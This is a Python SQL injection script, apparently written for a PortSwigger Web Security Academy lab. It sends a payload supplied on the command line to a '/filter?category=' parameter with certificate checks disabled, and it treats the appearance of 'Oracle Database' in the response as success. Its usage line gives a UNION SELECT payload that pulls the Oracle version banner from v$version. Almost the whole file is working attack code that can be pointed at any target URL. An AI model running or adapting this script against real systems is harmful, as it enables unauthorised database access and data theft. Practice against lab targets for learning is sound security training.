#!/usr/bin/env python3

import requests
import sys
import urllib3

# Disable SSL warnings for non-SSL connections
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Function to exploit SQL injection
def exploit_sqli(url, payload, proxies):
    try:
        uri = '/filter?category='
        response = requests.get(url + uri + payload, verify=False, proxies=proxies)

        # Check for Oracle Database error in the response text
        if "Oracle Database" in response.text:
            return True
        else:
            return False
    except requests.exceptions.RequestException as e:
        print(f"[-] Error during request: {e}")
        return False

# Main function to run the script
if __name__ == "__main__":
    try:
        # Collecting URL and payload from command-line arguments
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()

        # Initializing proxies as None in case '-x' is not provided
        proxies = None

        # Check if proxy argument is passed
        if '-x' in sys.argv:
            proxy_index = sys.argv.index('-x') + 1
            proxy = sys.argv[proxy_index].strip()
            # Setup the proxies dictionary for HTTP and HTTPS
            proxies = {'http': proxy, 'https': proxy}

    except IndexError:
        # Print usage if not enough arguments are supplied
        print(f"[-] Usage: {sys.argv[0]} <url> <payload> [-x <proxy>]")
        print(f"[-] Example: {sys.argv[0]} https://0a72000b03fc80ea8bc0de2b003c00ca.web-security-academy.net \"'UNION SELECT BANNER,NULL FROM v\\$version --\"")
        sys.exit(-1)

    # Perform the SQL injection attempt and print results
    if exploit_sqli(url, payload, proxies):
        # Print success message in green
        print("\033[92m[+] SQL injection successful! :) \033[0m")
    else:
        # Print failure message in red
        print("\033[91m[-] SQL injection failed! :( \033[0m")
